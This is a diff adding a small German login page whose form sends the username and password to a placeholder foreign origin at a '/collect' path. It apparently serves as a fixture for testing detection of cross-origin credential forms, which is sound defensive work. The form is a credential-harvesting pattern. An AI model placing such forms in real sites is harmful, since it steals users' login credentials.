@@ -1,0 +1,12 @@
+<!doctype html>
+<html lang="de"><head><meta charset="utf-8"><title>Anmelden</title>
+<style>body{font-family:Arial;max-width:340px;margin:60px auto}input{display:block;width:100%;box-sizing:border-box;padding:8px;margin:4px 0 12px}</style></head>
+<body>
+<h1>Anmelden</h1>
+<p>Die Anmeldung wird von unserem Authentifizierungsdienst verarbeitet.</p>
+<form id="sso" method="post" action="{{origin:foreign}}/ho-cross-action-de/collect">
+<label for="xu">Benutzername</label><input id="xu" name="u" type="text" autocomplete="username">
+<label for="xp">Passwort</label><input id="xp" name="p" type="password" autocomplete="current-password">
+<button type="submit" id="xgo">Anmelden</button>
+</form>
+</body></html>
